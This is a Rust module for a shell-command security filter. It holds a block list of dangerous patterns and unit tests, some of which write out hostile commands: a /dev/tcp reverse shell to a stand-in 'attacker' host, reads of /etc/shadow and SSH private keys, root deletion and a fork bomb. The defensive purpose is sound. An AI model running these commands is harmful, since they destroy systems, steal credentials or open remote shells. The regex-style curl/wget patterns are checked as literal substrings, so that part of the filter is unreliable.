//! Shell command security utilities
//!
//! Provides command filtering to prevent dangerous shell operations.

use crate::error::{PicoError, Result};

/// Default patterns that are blocked for security reasons.
/// Note: Patterns ending with space or special chars are matched with trailing boundary.
const DEFAULT_BLOCKED_PATTERNS: &[&str] = &[
    // Destructive file operations - exact root targets
    "rm -rf / ",  // rm -rf / with trailing space
    "rm -rf /\t", // rm -rf / with tab
    "rm -fr / ",  // rm -fr / with trailing space
    "rm -fr /\t", // rm -fr / with tab
    // Patterns that match end of command
    "> /dev/sd",
    "mkfs.",
    "mkfs ",
    "dd if=/dev/",
    // System modification
    "chmod -R 777 /",
    "chmod 777 /",
    // Network exfiltration patterns
    "curl.*|.*sh",
    "wget.*|.*sh",
    "nc -e",
    "bash -i >& /dev/tcp",
    // Credential access
    "/etc/shadow",
    "/etc/passwd",
    "~/.ssh/",
    ".ssh/id_",
    // Fork bombs and resource exhaustion
    ":(){ :|:& };:",
    "fork()",
];

/// Patterns that must match at the end of the command (after trimming).
const END_PATTERNS: &[&str] = &["rm -rf /", "rm -rf /*", "rm -fr /", "rm -fr /*"];

/// Configuration for shell command security.
#[derive(Debug, Clone)]
pub struct ShellSecurityConfig {
    /// Patterns that are blocked (commands containing these are rejected)
    pub blocked_patterns: Vec<String>,
    /// Whether to enable security checks (can be disabled for trusted environments)
    pub enabled: bool,
}

impl Default for ShellSecurityConfig {
    fn default() -> Self {
        Self {
            blocked_patterns: DEFAULT_BLOCKED_PATTERNS
                .iter()
                .map(|s| s.to_string())
                .collect(),
            enabled: true,
        }
    }
}

impl ShellSecurityConfig {
    /// Create a new shell security config with default blocked patterns.
    pub fn new() -> Self {
        Self::default()
    }

    /// Create a permissive config with no blocked patterns.
    ///
    /// # Warning
    /// This should only be used in trusted environments.
    pub fn permissive() -> Self {
        Self {
            blocked_patterns: Vec::new(),
            enabled: false,
        }
    }

    /// Add a custom blocked pattern.
    pub fn block_pattern(mut self, pattern: &str) -> Self {
        self.blocked_patterns.push(pattern.to_string());
        self
    }

    /// Check if a command is allowed.
    ///
    /// Returns `Ok(())` if the command is safe to execute,
    /// or `Err(SecurityViolation)` if it matches a blocked pattern.
    pub fn validate_command(&self, command: &str) -> Result<()> {
        if !self.enabled {
            return Ok(());
        }

        let command_lower = command.to_lowercase();
        let command_trimmed = command_lower.trim();

        // Check end patterns first (these must match at the end of the command)
        for pattern in END_PATTERNS {
            let pattern_lower = pattern.to_lowercase();
            if command_trimmed.ends_with(&pattern_lower) {
                return Err(PicoError::SecurityViolation(format!(
                    "Command blocked: ends with prohibited pattern '{}'",
                    pattern
                )));
            }
        }

        // Check substring patterns
        for pattern in &self.blocked_patterns {
            let pattern_lower = pattern.to_lowercase();
            if command_lower.contains(&pattern_lower) {
                return Err(PicoError::SecurityViolation(format!(
                    "Command blocked: contains prohibited pattern '{}'",
                    pattern
                )));
            }
        }

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_safe_command_allowed() {
        let config = ShellSecurityConfig::new();
        assert!(config.validate_command("echo hello").is_ok());
        assert!(config.validate_command("ls -la").is_ok());
        assert!(config.validate_command("cat file.txt").is_ok());
        assert!(config.validate_command("grep pattern file").is_ok());
    }

    #[test]
    fn test_rm_rf_root_blocked() {
        let config = ShellSecurityConfig::new();

        assert!(config.validate_command("rm -rf /").is_err());
        assert!(config.validate_command("rm -rf /*").is_err());
        assert!(config.validate_command("sudo rm -rf /").is_err());
    }

    #[test]
    fn test_rm_in_directory_allowed() {
        let config = ShellSecurityConfig::new();

        // Normal rm commands should be fine
        assert!(config.validate_command("rm file.txt").is_ok());
        assert!(config.validate_command("rm -rf ./temp").is_ok());
        assert!(config.validate_command("rm -rf /home/user/temp").is_ok());
    }

    #[test]
    fn test_credential_access_blocked() {
        let config = ShellSecurityConfig::new();

        assert!(config.validate_command("cat /etc/shadow").is_err());
        assert!(config.validate_command("cat /etc/passwd").is_err());
        assert!(config.validate_command("cat ~/.ssh/id_rsa").is_err());
    }

    #[test]
    fn test_fork_bomb_blocked() {
        let config = ShellSecurityConfig::new();

        assert!(config.validate_command(":(){ :|:& };:").is_err());
    }

    #[test]
    fn test_custom_pattern_blocked() {
        let config = ShellSecurityConfig::new().block_pattern("dangerous_script");

        assert!(config.validate_command("./dangerous_script.sh").is_err());
        assert!(config.validate_command("safe_script.sh").is_ok());
    }

    #[test]
    fn test_permissive_mode() {
        let config = ShellSecurityConfig::permissive();

        // Even dangerous commands allowed in permissive mode
        assert!(config.validate_command("rm -rf /").is_ok());
    }

    #[test]
    fn test_case_insensitive() {
        let config = ShellSecurityConfig::new();

        // Should catch regardless of case
        assert!(config.validate_command("RM -RF /").is_err());
        assert!(config.validate_command("Rm -Rf /").is_err());
    }

    #[test]
    fn test_network_exfiltration_blocked() {
        let config = ShellSecurityConfig::new();

        assert!(config
            .validate_command("bash -i >& /dev/tcp/attacker/443")
            .is_err());
    }

    #[test]
    fn test_default_config() {
        let config = ShellSecurityConfig::default();
        assert!(config.enabled);
        assert!(!config.blocked_patterns.is_empty());
    }
}
